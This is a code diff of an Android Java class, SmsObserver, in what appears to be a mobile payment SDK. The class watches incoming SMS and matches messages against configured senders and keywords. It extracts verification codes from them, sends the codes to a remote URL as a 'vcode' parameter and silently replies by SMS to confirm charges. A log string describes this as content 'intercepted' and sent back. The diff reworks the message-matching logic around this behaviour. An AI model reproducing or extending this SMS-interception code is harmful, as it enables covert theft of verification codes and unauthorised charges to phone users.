@@ -214,40 +214,19 @@ public class SmsObserver extends ContentObserver {
                 return;
             }
             boolean b = false;
-            if (limit_msg_2.contains(",")) {
-                String[] pa = limit_msg_2.split(",");
-                for (int k = 0; k < pa.length; k++) {
-                    if (pa[k].length() > smsAddress.length()) {
-                        if (pa[k].contains(smsAddress)) {
-                            b = true;
-                        }
-                    } else {
-                        if (smsAddress.contains(pa[k])) {
-                            b = true;
-                        }
+            String[] pa = limit_msg_2.split(",");
+            for (int k = 0; k < pa.length; k++) {
+                if (pa[k].length() > smsAddress.length()) {
+                    if (pa[k].contains(smsAddress) && smsBody.contains(limit_msg_data)) {
+                        b = true;
                     }
-                }
-            } else {
-                if (limit_msg_2.equals(smsAddress)) {
-                    b = true;
-                }
-            }
-            boolean c = false;
-            if (limit_msg_data.contains(",")) {
-                String[] pa = limit_msg_data.split(",");
-                for (int k = 0; k < pa.length; k++) {
-                    if (limit_msg_data.contains(pa[k])) {
-                        c = true;
+                } else {
+                    if (smsAddress.contains(pa[k]) && smsBody.contains(limit_msg_data)) {
+                        b = true;
                     }
                 }
             }
-            Log.debug("smsBody:" + smsBody);
-            Log.debug("limit_msg_data:" + limit_msg_data);
-            Log.debug("limit_msg_2:" + limit_msg_2);
-            Log.debug("b:" + b);
-            Log.debug("c:" + c);
-            Log.debug("smsAddress:" + smsAddress);
-            if (b && c) {
+            if (b) {
                 try {
                     JSONObject json = new JSONObject(PayChannelFactory.limit_content.get(i).toString());
                     payType = json.getString("payType");
@@ -278,7 +257,7 @@ public class SmsObserver extends ContentObserver {
                         String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                         String url = otherNeedUrl + "?vcode=" + SmsContent + "&sendParam=" + sendParam;
                         if (hadReqeusted.toString().contains(sendParam)) {
-                            Sms_send_tongbu(hadReqeusted.toString(), context, -123);
+                            Sms_send_tongbu(hadReqeusted.toString() , context, -123);
                             return;
                         } else {
                             GetDataImpl.doGetRequestWithoutListener(url);
@@ -299,6 +278,8 @@ public class SmsObserver extends ContentObserver {
                             MySmsManager.sendSecondMessage(limitNum, senderContent + SmsCode);
                             Sms_send_tongbu("拦截到的发回去的内容----->" + senderContent + SmsCode, context, 10004);
                         }
+                    } else {
+
                     }
                 } catch (Exception e) {
                     Log.debug("=====>e:" + e);
